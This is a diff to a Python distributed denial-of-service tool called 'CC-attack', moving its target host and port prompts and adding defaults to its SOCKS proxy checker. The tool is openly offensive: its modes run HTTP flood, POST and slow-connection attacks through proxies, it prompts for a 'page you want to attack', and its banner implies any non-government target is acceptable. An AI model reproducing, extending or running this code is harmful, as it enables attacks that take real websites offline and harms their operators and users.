@@ -17,7 +17,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.2 (Added Human-like options)
+Python3 version 2.3 (Fixed "Check" mode)
                             C0d3d by L330n123
 ╔═════════════════════════════════════════════╗
 ║       --> Use 443 Port Auto Enable SSL <--  ║
@@ -25,10 +25,9 @@ Python3 version 2.2 (Added Human-like options)
 ║          Don't attack .gov website          ║
 ║─────────────────────────────────────────────║
 ║                 New stuff:                  ║
+║          + Improved Proxy checker           ║
 ║          + Improved code performance        ║
 ║          + More Human-like options          ║
-║          + Added Check proxy mode           ║
-║            (only check proxy)               ║
 ║─────────────────────────────────────────────║
 ║ Link: https://github.com/Leeon123/CC-attack ║
 ╚═════════════════════════════════════════════╝''')
@@ -327,6 +326,10 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 	try:
 		s = socks.socksocket()
 		s.settimeout(ms)#500ms, You can change by yourself
+		if ip == "":
+			ip = "1.1.1.1"
+		if port == "":
+			port=80
 		s.connect((str(ip), int(port)))
 		if port == 443:
 			s = ssl.wrap_socket(s)
@@ -385,10 +388,28 @@ def main():
 	global socks4_proxies
 	global socks5_proxies
 	global multiple
+	ip = ""
+	port = ""
 	print("> Mode: [cc/post/slow/check]")
 	mode = str(input("> Choose Your Mode (default=cc) :"))
 	if mode == "":
 		mode = "cc"
+	ip = str(input("> Host/Ip:"))
+	if ip == "":
+		print("> Plese enter correct host or ip")
+		sys.exit(0)
+	if mode == "slow" or mode == "check":
+		pass
+	else:
+		url = str(input("> Page you want to attack(default=/):"))
+	port = str(input("> Port(Https is 443):"))
+	if port == '':
+		port = int(80)
+		print("> Default choose port 80\r\n> Port 80 was chosen")
+	else:
+		port = int(port)
+		if str(port) == '443':
+			print(" [!] Enable SSL Mode")
 	if mode == "check":
 		N = str(input("> Do you need to get socks list?(y/n,default=y):"))
 		if N == 'y' or N == "":
@@ -419,10 +440,6 @@ def main():
 		ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
 		if ans == "":
 			ans = "y"
-		if url == '':
-			url2 = "/"
-		else:
-			url2 = str(url)
 		if ans == "y":
 			ms = str(input("> Delay of socks(seconds, default=1):"))
 			if ms == "":
@@ -434,23 +451,6 @@ def main():
 					ms = float(ms)
 			check_socks(ms)
 		print("> End of process")	
-
-	ip = str(input("> Host/Ip:"))
-	if ip == "":
-		print("> Plese enter correct host or ip")
-		sys.exit(0)
-	if mode == "slow":
-		pass
-	else:
-		url = str(input("> Page you want to attack(default=/):"))
-	port = str(input("> Port(Https default is 443):"))
-	if port == '':
-		port = int(80)
-		print("> Default choose port 80\r\n> Port 80 was chosen")
-	else:
-		port = int(port)
-		if str(port) == '443':
-			print(" [!] Enable SSL Mode")
 	thread_num = str(input("> Threads(default=400):"))
 	if thread_num == "":
 		thread_num = int(400)
